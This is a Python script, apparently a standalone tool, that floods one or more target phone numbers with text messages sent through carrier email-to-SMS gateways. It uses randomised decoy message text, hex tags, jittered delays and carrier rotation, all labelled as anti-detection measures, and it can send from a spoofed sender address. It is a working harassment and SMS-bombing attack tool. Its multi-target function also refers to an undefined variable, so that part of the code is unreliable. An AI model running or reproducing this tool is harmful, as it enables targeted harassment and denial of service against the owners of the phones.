import logging
import os
import random
import re
import secrets
import smtplib
import time
import threading
from email.message import EmailMessage
from dotenv import load_dotenv
from typing import List, Dict, Union, Optional, Tuple, Any

load_dotenv()

logger = logging.getLogger(__name__)

# --- CONFIG (from .env) ---
SMTP_SERVER = os.environ["SMTP_HOST"]
SMTP_PORT = int(os.environ["SMTP_PORT"])
SMTP_USER = os.environ["SMTP_USER"]
SMTP_PASS = os.environ["SMTP_PASS"]
VERIFIED_SENDER = os.environ.get("GHOST_SENDER_EMAIL", os.environ["SENDER_EMAIL"])

# ---------------------------------------------------------------------------
# CARRIER GATEWAYS
# ---------------------------------------------------------------------------

CARRIERS = {
    "Verizon": "vtext.com",
    "T-Mobile": "tmomail.net",
    "AT&T": "txt.att.net",
    "Sprint": "messaging.sprintpcs.com",
    "Visible": "vmobl.com",
    "Boost": "sms.myboostmobile.com",
    "Cricket": "sms.cricketwireless.net",
    "MetroPCS": "mymetropcs.com",
    "Google Fi": "msg.fi.google.com",
    "US Cellular": "email.uscc.net",
    "Republic": "text.republicwireless.com",
    "Consumer Cellular": "mailmymobile.net",
    "Tracfone": "mmst5.tracfone.com",
    "Xfinity": "vtext.com",
    "Mint Mobile": "tmomail.net",
    "Straight Talk": "vtext.com",
}

# ---------------------------------------------------------------------------
# TEMPLATE POOLS
# ---------------------------------------------------------------------------

CASUAL_STARTERS = [
    "Hey, did you see my last text?",
    "Yo, what time works for you?",
    "Hey! Long time no talk",
    "Dude, check your email when you get a chance",
    "Sup, you free later?",
    "Omg did you hear about {topic}?",
    "Hey are you coming to {event}?",
    "Lol I just saw the funniest thing",
    "Whatcha up to {time}?",
    "Hey! I tried calling you earlier",
    "You around? Need a quick favor",
    "Miss ya, we should catch up soon",
]

URGENT_STARTERS = [
    "Hey call me ASAP",
    "Need to talk to you about something",
    "Are you around? It's kind of important",
    "Can you check your email real quick?",
    "Hey, something came up, text me back",
    "Urgent -- when are you free?",
]

QUESTION_STARTERS = [
    "Quick question -- do you still have {item}?",
    "Hey do you know {name}'s number?",
    "What was the address again?",
    "Did you end up getting {item}?",
    "What time does {event} start?",
    "Do you remember where we parked?",
    "Can you send me that link from earlier?",
    "Hey which {item} did you recommend?",
]

FOLLOWUP_STARTERS = [
    "Just following up on earlier",
    "Did you end up going?",
    "So what happened with {topic}?",
    "Any update on that thing we talked about?",
    "Hey just checking in about {time}",
    "Did you figure out the {topic} situation?",
    "Wanted to circle back about {event}",
]

SHORT_STARTERS = [
    "Yo",
    "Hey!",
    "Call me",
    "U up?",
    "Wyd",
    "Where u at",
    "Text me back",
    "Check your email",
]

TOPICS = [
    "Instagram", "Twitter", "the news", "that YouTube video", "Discord",
    "the game last night", "TikTok", "that restaurant", "the concert",
    "work drama", "the party", "that show on Netflix", "the weather",
    "gas prices", "the new update",
]

TIMES = [
    "lunch", "tonight", "2 PM", "this weekend", "the game",
    "tomorrow", "later", "after work", "around 5", "in an hour",
    "Saturday", "this afternoon",
]

NAMES = [
    "Alex", "Jordan", "Casey", "Taylor", "Morgan", "Sam", "Chris",
    "Jamie", "Riley", "Drew", "Quinn", "Avery", "Blake", "Reese",
    "Skyler", "Sage", "Dakota", "Charlie", "Finley", "Hayden",
]

ITEMS = [
    "that charger", "the tickets", "the key", "my jacket",
    "the book I lent you", "those headphones", "the adapter",
    "that recipe", "the password", "my hoodie",
]

EVENTS = [
    "the thing Friday", "Jake's party", "the cookout", "brunch",
    "the meeting", "trivia night", "the concert", "movie night",
    "the gym", "happy hour",
]

ALL_STARTERS = CASUAL_STARTERS + URGENT_STARTERS + QUESTION_STARTERS + FOLLOWUP_STARTERS + SHORT_STARTERS

# ---------------------------------------------------------------------------
# CARRIER RATE INTELLIGENCE
# ---------------------------------------------------------------------------


class CarrierTracker:
    def __init__(self) -> None:
        self._success: Dict[str, int] = {}
        self._fail: Dict[str, int] = {}
        self._cooldowns: Dict[str, float] = {}
        self._lock = threading.Lock()
        self.COOLDOWN = 45.0

    def record_success(self, gateway: str) -> None:
        with self._lock:
            self._success[gateway] = self._success.get(gateway, 0) + 1

    def record_failure(self, gateway: str) -> None:
        with self._lock:
            self._fail[gateway] = self._fail.get(gateway, 0) + 1
            total_fail = self._fail[gateway]
            if total_fail >= 3:
                total_ok = self._success.get(gateway, 0)
                if total_ok == 0 or (total_fail / (total_ok + total_fail)) > 0.7:
                    self._cooldowns[gateway] = time.time()

    def select_carriers(self, count: int) -> List[str]:
        with self._lock:
            now = time.time()
            gateways = list(CARRIERS.values())
            candidates = []
            weights = []
            for gw in gateways:
                if now - self._cooldowns.get(gw, 0) < self.COOLDOWN:
                    continue
                candidates.append(gw)
                total = self._success.get(gw, 0) + self._fail.get(gw, 0)
                if total < 3:
                    weights.append(1.0)
                else:
                    rate = self._success.get(gw, 0) / total
                    weights.append(0.1 + rate)

            if not candidates:
                candidates = gateways
                weights = [1.0] * len(gateways)

            sequence = random.choices(candidates, weights=weights, k=count)
            random.shuffle(sequence)
            return sequence

    def get_stats(self) -> Dict[str, dict]:
        with self._lock:
            stats = {}
            for gw in set(list(self._success.keys()) + list(self._fail.keys())):
                s = self._success.get(gw, 0)
                f = self._fail.get(gw, 0)
                total = s + f
                stats[gw] = {
                    "success": s, "failed": f,
                    "rate": round(s / total * 100, 1) if total > 0 else 0.0,
                }
            return stats


_carrier_tracker = CarrierTracker()

# ---------------------------------------------------------------------------
# ANTI-DETECTION TIMING
# ---------------------------------------------------------------------------


def _warmup_delay(index: int) -> float:
    if index == 0:
        return random.uniform(1.0, 3.0)
    if index < 3:
        return random.uniform(3.0, 6.0)
    return 0.0


def _inter_message_delay(index: int, count: int) -> float:
    if random.random() < 0.08:
        return random.uniform(15.0, 30.0)
    if random.random() < 0.15:
        return random.uniform(8.0, 14.0)
    return random.uniform(2.0, 8.0)


# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------


def clean_phone_number(number: str) -> str:
    digits = re.sub(r"\D", "", number)
    if digits.startswith("1") and len(digits) == 11:
        digits = digits[1:]
    if len(digits) != 10:
        raise ValueError(f"Invalid phone number: '{number}' -> '{digits}' (expected 10 digits)")
    return digits


def get_ghost_payload() -> str:
    template = random.choice(ALL_STARTERS)
    body = template.format(
        time=random.choice(TIMES),
        topic=random.choice(TOPICS),
        name=random.choice(NAMES),
        item=random.choice(ITEMS),
        event=random.choice(EVENTS),
    )
    body += f" [{secrets.token_hex(2).upper()}]"
    return body


# ---------------------------------------------------------------------------
# SEND SINGLE SMS
# ---------------------------------------------------------------------------


def _send_single_sms(
    target_number: str,
    gateway: str,
    cancel_event: Optional[threading.Event] = None,
) -> Tuple[bool, str]:
    if cancel_event and cancel_event.is_set():
        return False, "Cancelled"

    for attempt in range(2):
        try:
            recipient = f"{target_number}@{gateway}"
            msg = EmailMessage()
            msg.set_content(get_ghost_payload())
            msg["Subject"] = ""
            msg["From"] = VERIFIED_SENDER
            msg["To"] = recipient

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10) as server:
                server.starttls()
                server.login(SMTP_USER, SMTP_PASS)
                server.send_message(msg)

            _carrier_tracker.record_success(gateway)
            return True, f"Delivered via {gateway}"
        except smtplib.SMTPServerDisconnected:
            _carrier_tracker.record_failure(gateway)
            if attempt == 0:
                time.sleep(1)
                continue
            return False, f"Disconnected on {gateway}"
        except Exception as e:
            _carrier_tracker.record_failure(gateway)
            return False, f"{gateway}: {e}"

    return False, f"Failed on {gateway} after retries"


# ---------------------------------------------------------------------------
# MAIN SMS LAUNCHER
# ---------------------------------------------------------------------------


def send_ghost_sms(
    target_number: str,
    count: int = 10,
    progress_callback=None,
    cancel_event: Optional[threading.Event] = None,
) -> Dict:
    target_number = clean_phone_number(target_number)

    logger.info("Initializing Ghost SMS strike against %s (%d payloads)", target_number, count)
    start_time = time.time()

    gateways = _carrier_tracker.select_carriers(count)
    carriers_used: set = set()
    success_count = 0
    errors: Dict[str, int] = {}

    for i in range(count):
        if cancel_event and cancel_event.is_set():
            logger.info("Ghost SMS cancelled at payload %d/%d", i, count)
            break

        warmup = _warmup_delay(i)
        if warmup > 0:
            time.sleep(warmup)

        gateway = gateways[i]
        ok, detail = _send_single_sms(target_number, gateway, cancel_event)

        if ok:
            success_count += 1
            carriers_used.add(gateway)
            logger.info("Payload %d/%d: %s", i + 1, count, detail)
        else:
            err_key = detail.split(":")[0] if ":" in detail else detail
            errors[err_key] = errors.get(err_key, 0) + 1
            logger.warning("Payload %d/%d failed: %s", i + 1, count, detail)

        if progress_callback and (i + 1) % max(1, count // 10) == 0:
            try:
                progress_callback(i + 1, count, detail)
            except Exception:
                pass

        if i < count - 1:
            delay = _inter_message_delay(i, count)
            time.sleep(delay)

    duration = time.time() - start_time
    failed = count - success_count

    logger.info(
        "Ghost SMS complete: %d/%d delivered in %.1fs (%d carriers)",
        success_count, count, duration, len(carriers_used),
    )

    return {
        "total": count,
        "success": success_count,
        "failed": failed,
        "carriers_used": list(carriers_used),
        "carrier_stats": _carrier_tracker.get_stats(),
        "errors": errors,
        "duration_seconds": round(duration, 1),
    }


# ---------------------------------------------------------------------------
# MULTI-TARGET SMS
# ---------------------------------------------------------------------------


def send_ghost_sms_multi(
    targets: List[str],
    count_per_number: int = 10,
    progress_callback=None,
    cancel_event: Optional[threading.Event] = None,
) -> Dict:
    logger.info("Multi-target Ghost SMS: %d numbers, %d each", len(numbers), count_per_number)

    all_results: Dict = {
        "total": 0, "success": 0, "failed": 0,
        "carriers_used": [], "errors": {}, "per_target": {},
        "duration_seconds": 0,
    }
    start_time = time.time()

    for number in numbers:
        if cancel_event and cancel_event.is_set():
            break
        result = send_ghost_sms(number, count_per_number, progress_callback, cancel_event)
        all_results["total"] += result["total"]
        all_results["success"] += result["success"]
        all_results["failed"] += result["failed"]
        all_results["carriers_used"].extend(result.get("carriers_used", []))
        for err, count in result.get("errors", {}).items():
            all_results["errors"][err] = all_results["errors"].get(err, 0) + count
        all_results["per_target"][number] = result

    all_results["carriers_used"] = list(set(all_results["carriers_used"]))
    all_results["duration_seconds"] = round(time.time() - start_time, 1)
    return all_results


if __name__ == "__main__":
    import argparse

    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

    parser = argparse.ArgumentParser()
    parser.add_argument("number", help="Target phone number(s) -- comma-separated for multi")
    parser.add_argument("--count", type=int, default=5, help="Payloads per number")
    args = parser.parse_args()

    numbers = [n.strip() for n in args.number.split(",")]
    if len(numbers) > 1:
        results = send_ghost_sms_multi(numbers, args.count)
    else:
        results = send_ghost_sms(numbers[0], args.count)
    print(f"\nResults: {results}")
